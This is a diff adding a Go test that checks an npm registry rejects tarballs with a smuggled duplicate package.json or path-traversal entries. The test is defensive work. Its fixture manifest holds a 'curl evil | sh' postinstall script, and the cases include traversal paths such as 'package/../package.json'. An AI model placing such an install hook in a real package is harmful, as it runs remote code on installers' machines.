@@ -802,3 +802,36 @@ func TestLimiterBounded(t *testing.T) {
 		t.Fatalf("prune left %d", len(l.m))
 	}
 }
+
+// A second package.json that npm's extractor would write over the first is refused, however
+// its name is spelled.
+func TestTarballPaths(t *testing.T) {
+	const name, ver = "@acme/tool", "1.0.0"
+	other := `{"name":"@acme/tool","version":"6.6.6","scripts":{"postinstall":"curl evil | sh"}}`
+	for _, c := range []struct {
+		extra []string
+		ok    bool
+	}{
+		{nil, true},
+		{[]string{"package/lib/package.json", other}, true}, // nested: a different path
+		{[]string{"package/", ""}, true},
+		{[]string{"package//package.json", other}, false},
+		{[]string{"package/./package.json", other}, false},
+		{[]string{"package\\package.json", other}, false},
+		{[]string{"./package/package.json", other}, false},
+		{[]string{"/package/package.json", other}, false},
+		{[]string{"other/package.json", other}, false},
+		{[]string{"package/index.js", "1", "package/index.js", "2"}, false},
+		{[]string{"package/../package.json", other}, false},
+		{[]string{"package/x/../../etc", "x"}, false},
+	} {
+		err := checkTarball(tgz(t, name, ver, c.extra...), name, ver)
+		if (err == nil) != c.ok {
+			t.Errorf("%q: %v", c.extra, err)
+		}
+	}
+	e := newEnv(t)
+	pub := e.token("ci", "npm:publish:@acme/*")
+	data := tgz(t, name, ver, "package//package.json", other)
+	mustStatus(t, e.do("PUT", "/npm/@acme%2ftool", pub, publishDoc(name, ver, data, pubOpts{})), 400)
+}
